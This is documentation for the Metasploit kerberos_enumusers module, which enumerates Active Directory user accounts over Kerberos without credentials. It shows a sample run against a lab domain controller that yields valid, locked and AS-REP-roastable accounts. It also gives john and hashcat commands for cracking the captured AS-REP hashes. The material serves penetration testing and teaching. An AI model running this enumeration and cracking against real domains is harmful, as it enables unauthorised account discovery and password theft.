## Vulnerable Application

The kerberos_enumusers module is used to enumerate valid Domain Users
via Kerberos from a wholly unauthenticated perspective. It utilises the
different responses returned by the service to identify users that exist
within the target domain. It is also able to identify whether user
accounts are enabled or disabled/locked out.

## Verification Steps

When verifying the module in the listed examples, it is recommended to test the following accounts:

- Valid account
- Invalid account
- Locked/Disabled account
- Account with spaces
- AS-REP Roastable accounts

## Target

To use kerberos_enumusers, make sure you are able to connect to the
Kerberos service on a Domain Controller.

## Scenarios

The following demonstrates basic usage, using a custom wordlist,
targeting a single Domain Controller to identify valid domain user
accounts.

Create a new `./users.txt` file, then run the module:

```
msf6 auxiliary(gather/kerberos_enumusers) > run rhost=192.168.123.228 domain=domain.local user_file=./users.txt verbose=true
[*] Running module against 192.168.123.228

[*] Using domain: ADF3.LOCAL - 192.168.123.228:88...
[*] 192.168.123.228:88 - User: "missing123" user not found
[+] 192.168.123.228:88 - User: "administrator" is present
[+] 192.168.123.228:88 - User: "account with spaces" is present
[-] 192.168.123.228:88 - User: "locked_account" account disabled or locked out
[+] 192.168.123.228:88 - User: "no_pre_auth" does not require preauthentication. Hash: $krb5asrep$23$no_pre_auth@DOMAIN.LOCAL:bdb54b9e...etc..etc...
[+] 192.168.123.228:88 - User: "fake_mysql" is present
[*] 192.168.123.228:88 - User: "missing1234" user not found
[*] Auxiliary module execution completed
msf6 auxiliary(gather/kerberos_enumusers) > 
```

### ASREPRoast Cracking

Accounts that have `Do not require Kerberos preauthentication` enabled, will receive an ASREP response with a ticket present.
The technique of cracking this token offline is called ASREPRoasting.

Cracking ASREP response with John:

```
john ./hashes.txt --wordlist=./wordlist.txt --format:krb5asrep
```

Cracking ASREP response with Hashcat:

```
hashcat -m 18200 -a 0 ./hashes.txt ./wordlist.txt
```

You can see previously creds with:

```
creds -v
```

## Options

The `kerberos_enumusers` module only requires the `RHOST`, `DOMAIN` and
`USER_FILE` options to run.

**The DOMAIN option**

This option is used to specify the target domain. If the domain name is
incorrect an error is returned and domain user account enumeration will fail.

An example of setting DOMAIN:

```
set DOMAIN [domain name]
```

**The USER_FILE option**

This option is used to specify the file containing a list of user names
to query the Domain Controller to identify if they exist in the target domain
or not. One per line.

An example of setting USER_FILE:

```
set USER_FILE [path to file]
```

**The Timeout option**

This option is used to specify the TCP timeout i.e. the time to wait
before a connection to the Domain Controller is established and data read.

An example of setting Timeout:

```
set Timeout [value in seconds]
```
